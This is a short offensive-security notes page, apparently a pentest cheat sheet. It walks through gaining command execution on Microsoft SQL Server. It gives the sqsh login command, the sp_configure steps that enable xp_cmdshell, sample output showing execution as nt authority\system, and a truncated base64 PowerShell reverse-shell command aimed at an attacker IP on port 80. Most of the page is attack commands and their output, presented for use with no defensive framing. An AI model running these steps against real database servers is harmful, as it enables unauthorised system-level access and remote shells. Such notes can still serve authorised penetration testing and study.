# MSSQL

### Getting RCE on MSSQL

{% embed url="https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server" %}

{% embed url="https://rioasmara.com/2020/01/31/mssql-rce-and-reverse-shell-xp_cmdshell" %}

xp\_cmdshell - Can only be executed by 'sa' and any other users with 'sysadmin' privileges

By default, only sysadmin is allowed to use it and in SQL Server 2005 it is disabled by default (it can be enabled again using sp\_configure)

If we have credentials and mssql port is open to external access, we can connect with sqsh.

```
sqsh -S 192.168.1.2 -U {USER} -P {PASS} -D {DATABASENAME(NOT REQUIRED)}
```

```
1> EXEC master..xp_cmdshell 'whoami'
2> go

Msg 15281, Level 16, State 1
Server 'TEST\SQLEXPRESS', Procedure 'master..xp_cmdshell', Line 1
SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell'
because this component is turned off as part of the security configuration for this
server. A system administrator can enable the use of 'xp_cmdshell' by using
sp_configure. For more information about enabling 'xp_cmdshell', search for
'xp_cmdshell' in SQL Server Online.
```

If the output like the above then you need to activate the cmdshell feature with below commands

```
1> EXEC SP_CONFIGURE 'show advanced options',1
2> reconfigure
3> go
Configuration option 'show advanced options' changed from 0 to 1. Run the
RECONFIGURE statement to install.
(return status = 0)

1> EXEC SP_CONFIGURE 'xp_cmdshell',1
2> reconfigure
3> go
Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE
statement to install.
(return status = 0)
```

With the above command we have configured that our SQL Server is able to execute command at the server.

```
1> xp_cmdshell 'whoami'
2> go

        output                                                                      

        ----------------------------------------------------------------------------
------------------------------------------------------------------------------------
------------------------------------------------------------------------------------
------------------------------------------------------------------------------------
------------------------------------------------------------------------------------
------------------------------------------------------------------------------------
----------------

        nt authority\system                                                         

        NULL                                                                        

(2 rows affected, return status = 0)
```

To get reverse shell, we can execute powershell command.

https://www.revshells.com/ - Powershell #3 (Base64) - 192.168.1.1 - 80 - powershell

```
1> EXEC master..xp_cmdshell 'powershell -e JABjAG..........'
2> go
```
